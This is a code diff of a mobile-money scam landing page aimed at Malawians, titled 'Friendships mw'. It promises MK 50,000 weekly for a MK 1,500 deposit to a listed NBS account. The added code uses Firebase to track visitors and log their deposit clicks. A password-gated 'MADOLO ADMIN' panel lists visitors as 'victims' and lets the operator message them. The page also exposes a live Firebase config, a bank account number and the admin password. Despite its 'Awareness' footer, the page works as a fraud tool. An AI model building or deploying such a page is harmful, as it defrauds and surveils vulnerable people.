@@ -3,64 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Friendships mw | Earn & Claim</title>
+    <title>Friendships mw | Secure Earnings</title>
     
-    <meta property="og:title" content="Friendships mw | Join Now">
-    <meta property="og:description" content="Register with MK 1,500. Secure your spot and claim weekly earnings.">
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+    <meta property="og:title" content="Friendships mw | Earn Weekly">
+    <meta property="og:description" content="Register now with MK 1,500 and join the elite earners in Malawi.">
     <meta property="og:image" content="https://dizzar-mw.github.io/EasyMoney/ad.png">
     <link rel="icon" type="image/png" href="favicon.png">
 
     <style>
-        :root { 
-            --wa-green: #075E54; --wa-light: #25D366; --bg: #f0f2f5; 
-            --text: #333; --card: #ffffff; --airtel: #FF0000; --mpamba: #25D366;
-        }
-        .dark-theme { 
-            --bg: #111b21; --text: #e9edef; --card: #222e35; --wa-green: #202c33; 
-        }
+        :root { --wa-green: #075E54; --wa-light: #25D366; --bg: #f0f2f5; --text: #333; --card: #ffffff; }
+        .dark-theme { --bg: #111b21; --text: #e9edef; --card: #222e35; --wa-green: #202c33; }
         
         body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: var(--bg); color: var(--text); transition: 0.3s; }
         nav { background: var(--wa-green); color: white; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
         
+        .online-badge { background: #ff3b30; color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold; }
         .dropbtn { background: #128c7e; border: none; color: white; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
         .dropdown-content { display: none; position: absolute; right: 20px; top: 55px; background: var(--card); min-width: 180px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); border-radius: 8px; z-index: 1001; }
         .dropdown-content button { width: 100%; border: none; padding: 12px; background: none; color: var(--text); text-align: left; cursor: pointer; border-bottom: 1px solid #4444; }
 
         .container { max-width: 450px; margin: 20px auto; padding: 15px; }
-        .card { background: var(--card); border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        .card { background: var(--card); border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; margin-bottom: 20px; }
         
         /* 3D Flip */
         .flip-container { perspective: 1000px; width: 100%; height: 230px; margin: 0 auto 15px; }
         .flipper { width: 100%; height: 100%; transition: 0.8s; transform-style: preserve-3d; position: relative; }
         .do-flip { transform: rotateY(180deg); }
-        .front, .back { width: 100%; height: 100%; backface-visibility: hidden; position: absolute; top: 0; border-radius: 10px; overflow: hidden; border: 1px solid #ddd; }
+        .front, .back { width: 100%; height: 100%; backface-visibility: hidden; position: absolute; top: 0; left: 0; border-radius: 10px; overflow: hidden; border: 1px solid #ddd; }
         .back { transform: rotateY(180deg); }
         .proof-img { width: 100%; height: 100%; object-fit: contain; background: #000; }
 
-        /* Guide Steps */
-        .steps { text-align: left; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
-        .step-num { display: inline-block; background: var(--wa-green); color: white; width: 22px; height: 22px; text-align: center; border-radius: 50%; font-size: 12px; margin-right: 8px; }
-
-        /* Deposit Dropdown */
-        .deposit-menu { display: none; margin-top: 10px; border-radius: 8px; overflow: hidden; animation: slideDown 0.3s ease; }
-        .btn-mpamba { background: var(--mpamba); color: white; padding: 15px; width: 100%; border: none; font-weight: bold; cursor: pointer; }
-        .btn-airtel { background: var(--airtel); color: white; padding: 15px; width: 100%; border: none; font-weight: bold; cursor: pointer; }
-        .main-pay-btn { background: #333; color: white; padding: 16px; width: 100%; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        /* Deposit Buttons */
+        .btn-mpamba { background: #25D366; color: white; padding: 15px; width: 100%; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 10px; }
+        .btn-airtel { background: #FF0000; color: white; padding: 15px; width: 100%; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 5px; }
 
         /* Admin Side Chat */
-        #admin-side { display: none; }
-        .chat-window { background: #e5ddd5; border-radius: 8px; height: 300px; overflow-y: scroll; padding: 15px; border: 1px solid #ccc; font-size: 13px; color: black; }
-        .msg { background: white; padding: 8px; border-radius: 5px; margin-bottom: 8px; max-width: 80%; }
-        .msg-admin { background: #dcf8c6; margin-left: auto; text-align: right; }
-
-        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-        footer { text-align: center; padding: 20px; font-size: 12px; opacity: 0.6; }
+        #admin-side { display: none; text-align: left; }
+        .chat-window { background: #e5ddd5; border-radius: 8px; height: 300px; overflow-y: auto; padding: 15px; border: 1px solid #ccc; font-size: 13px; color: black; display: flex; flex-direction: column; }
+        .msg { background: white; padding: 8px; border-radius: 5px; margin-bottom: 8px; max-width: 85%; box-shadow: 1px 1px 1px rgba(0,0,0,0.1); }
+        .msg-admin { background: #dcf8c6; align-self: flex-end; }
+        
+        footer { text-align: center; padding: 20px; font-size: 11px; opacity: 0.6; }
     </style>
 </head>
 <body>
 
 <nav>
-    <strong>Friendships mw</strong>
+    <strong>Friendships mw <span id="online-count" class="online-badge">0 Live</span></strong>
     <div class="dropdown">
         <button class="dropbtn" onclick="toggleMenu()">Menu ▾</button>
         <div id="dropdownContent" class="dropdown-content">
@@ -80,44 +72,48 @@
             </div>
         </div>
 
-        <h2 id="hero-h" style="margin-top:0;">Secure Your Earnings</h2>
+        <h2 id="hero-h">Earn MK 50,000 Weekly!</h2>
+        <p id="hero-p" style="font-size:14px;">Deposit MK 1,500 to activate your wallet.</p>
         
-        <div class="steps" id="guide-steps">
-            <p><span class="step-num">1</span> Choose your Network and Deposit MK 1,500.</p>
-            <p><span class="step-num">2</span> Account Activation takes 5 minutes.</p>
-            <p><span class="step-num">3</span> <b>Claim:</b> Withdraw MK 50,000 every Friday.</p>
-        </div>
-
-        <button class="main-pay-btn" id="dep-btn" onclick="toggleDeposit()">DEPOSIT TO START EARNING ▾</button>
+        <button class="btn-mpamba" onclick="logAction('Mpamba Deposit Clicked')">Deposit via TNM Mpamba</button>
+        <button class="btn-airtel" onclick="logAction('Airtel Deposit Clicked')">Deposit via Airtel Money</button>
         
-        <div class="deposit-menu" id="depositMenu">
-            <button class="btn-mpamba" onclick="processPay('Mpamba')">Pay via Mpamba (TNM)</button>
-            <button class="btn-airtel" onclick="processPay('Airtel Money')">Pay via Airtel Money</button>
-            <div style="background: #eee; padding: 10px; font-size: 12px; color: #555;">
-                Account: NBS Bank - 25101363
-            </div>
-        </div>
+        <p style="font-size: 11px; margin-top: 15px;">NBS Account: 25101363</p>
     </div>
 </div>
 
 <div class="container" id="admin-side">
-    <div class="card" style="border-top: 5px solid red;">
-        <h3>🚨 ADMIN LIVE CHAT (Hucker View)</h3>
-        <p style="font-size:12px;">Every time a victim clicks deposit, a "text" alert is sent to the 12 admins via Telegram API.</p>
-        <div class="chat-window" id="chatWindow">
-            <div class="msg">System: Waiting for leads...</div>
+    <div class="card" style="border: 2px solid #ff4d4d;">
+        <h3 style="color:#ff4d4d; margin-top:0;">MADOLO ADMIN</h3>
+        <div id="victim-list" style="font-size: 11px; background: #eee; padding: 8px; border-radius: 5px; margin-bottom: 10px; max-height: 60px; overflow-y: auto;">
+            Scanning for IP...
         </div>
-        <input type="text" id="adminMsg" placeholder="Type to victim..." style="width:70%; padding:10px;">
-        <button onclick="sendAdminText()" style="padding:10px;">Send</button>
-        <hr>
-        <button onclick="location.reload()" class="main-pay-btn">Exit Panel</button>
+        <div class="chat-window" id="chat-window"></div>
+        <div style="display:flex; margin-top:10px;">
+            <input type="text" id="admin-input" placeholder="Text victim..." style="flex:1; padding:10px;">
+            <button onclick="sendAdminMsg()" style="padding:10px; background:var(--wa-green); color:white; border:none;">Send</button>
+        </div>
+        <button onclick="location.reload()" style="width:100%; margin-top:10px; padding:5px; border:none; background:#ccc;">Logout</button>
     </div>
 </div>
 
-<footer>&copy; 2026 Friendships mw Security Awareness</footer>
+<footer>&copy; 2026 Awareness Platform</footer>
 
 <script>
-    // 🚀 GITHUB API & FLIP LOGIC
+    // --- 1. FIREBASE CONFIG (Your Real Keys) ---
+    const firebaseConfig = {
+        apiKey: "AIzaSyDGMaQZ196VVBWIWxO_5sgDFjvH3OU8Bkc",
+        authDomain: "easymoney-f824b.firebaseapp.com",
+        databaseURL: "https://easymoney-f824b-default-rtdb.firebaseio.com",
+        projectId: "easymoney-f824b",
+        storageBucket: "easymoney-f824b.firebasestorage.app",
+        messagingSenderId: "589780919277",
+        appId: "1:589780919277:web:de9049822ec64c7eaa3de4"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // --- 2. GITHUB API (For Proof Folder) ---
     const repoOwner = "dizzar-mw";
     const repoName = "EasyMoney";
     const folderPath = "flip%20Image";
@@ -147,61 +143,54 @@
         }, 5000);
     }
 
-    // 💰 DEPOSIT LOGIC
-    function toggleDeposit() {
-        const m = document.getElementById('depositMenu');
-        m.style.display = (m.style.display === 'block') ? 'none' : 'block';
+    // --- 3. LIVE TRACKING & CHAT ---
+    const deviceId = localStorage.getItem('did') || 'V-'+Math.floor(Math.random()*9000);
+    localStorage.setItem('did', deviceId);
+
+    // Track Online Presence
+    const myPresenceRef = db.ref('presence/' + deviceId);
+    myPresenceRef.set({ status: "online", last: Date.now() });
+    myPresenceRef.onDisconnect().remove();
+
+    db.ref('presence').on('value', snap => {
+        document.getElementById('online-count').innerText = snap.numChildren() + " Live";
+        let list = "";
+        snap.forEach(u => { list += `Device: ${u.key} (Online)<br>`; });
+        document.getElementById('victim-list').innerHTML = list;
+    });
+
+    // Logging & Chat
+    function logAction(act) {
+        db.ref('chat').push({ sender: deviceId, text: act, time: Date.now() });
+        alert("Verification in progress. Please wait 5 minutes.");
     }
 
-    function processPay(method) {
-        alert(`Redirecting to ${method} Gateway...\nPlease send MK 1,500 to NBS Account 25101363.`);
-        // SIMULATED TEXT TO ADMIN
-        logToAdmin(`Victim clicked ${method}. Status: Waiting for cash.`);
+    function sendAdminMsg() {
+        const val = document.getElementById('admin-input').value;
+        if(!val) return;
+        db.ref('chat').push({ sender: "Admin", text: val, time: Date.now() });
+        document.getElementById('admin-input').value = "";
     }
 
-    // 📱 ADMIN CHAT LOGIC
-    function logToAdmin(text) {
-        const win = document.getElementById('chatWindow');
-        win.innerHTML += `<div class="msg"><b>Lead:</b> ${text}</div>`;
+    db.ref('chat').limitToLast(15).on('value', snap => {
+        const win = document.getElementById('chat-window');
+        win.innerHTML = "";
+        snap.forEach(m => {
+            const data = m.val();
+            const cls = data.sender === "Admin" ? "msg msg-admin" : "msg";
+            win.innerHTML += `<div class="${cls}"><b>${data.sender}:</b> ${data.text}</div>`;
+        });
         win.scrollTop = win.scrollHeight;
-        // REAL TELEGRAM API CALL:
-        // fetch(`https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_ID&text=${text}`);
-    }
+    });
 
-    function sendAdminText() {
-        const val = document.getElementById('adminMsg').value;
-        if(val) {
-            document.getElementById('chatWindow').innerHTML += `<div class="msg msg-admin">${val}</div>`;
-            document.getElementById('adminMsg').value = "";
-        }
-    }
-
-    // 🌍 MENU & LANG
-    function toggleMenu() {
-        const c = document.getElementById("dropdownContent");
-        c.style.display = (c.style.display === "block") ? "none" : "block";
-    }
-
-    function toggleTheme() {
-        document.body.classList.toggle("dark-theme");
-        document.getElementById("themeBtn").innerText = document.body.classList.contains("dark-theme") ? "Light Mode" : "Dark Mode";
-    }
-
-    let isChi = false;
+    // --- 4. UI UTILITIES ---
+    function toggleMenu() { document.getElementById("dropdownContent").style.display = (document.getElementById("dropdownContent").style.display === "block") ? "none" : "block"; }
+    function toggleTheme() { document.body.classList.toggle("dark-theme"); }
     function toggleLang() {
         isChi = !isChi;
-        document.getElementById("langBtn").innerText = isChi ? "English" : "Chichewa";
-        document.getElementById("hero-h").innerText = isChi ? "Tsimikizani Malipiro Anu" : "Secure Your Earnings";
-        document.getElementById("dep-btn").innerText = isChi ? "LIPIRANI KUTI MUYAMBE ▾" : "DEPOSIT TO START EARNING ▾";
-        document.getElementById("guide-steps").innerHTML = isChi ? 
-            `<p><span class="step-num">1</span> Sankhani njira ndipo lipirani MK 1,500.</p>
-             <p><span class="step-num">2</span> Kudikira kutsegulidwa kwa mphindi 5.</p>
-             <p><span class="step-num">3</span> <b>Claim:</b> Tengani MK 50,000 Lachisanu lililonse.</p>` :
-            `<p><span class="step-num">1</span> Choose your Network and Deposit MK 1,500.</p>
-             <p><span class="step-num">2</span> Account Activation takes 5 minutes.</p>
-             <p><span class="step-num">3</span> <b>Claim:</b> Withdraw MK 50,000 every Friday.</p>`;
+        document.getElementById("hero-h").innerText = isChi ? "Pezani MK 50,000 Sabata Iliyonse!" : "Earn MK 50,000 Weekly!";
     }
-
+    let isChi = false;
     function enterAdmin() {
         if (prompt("Security Code:") === "madolo") {
             document.getElementById("user-side").style.display = "none";
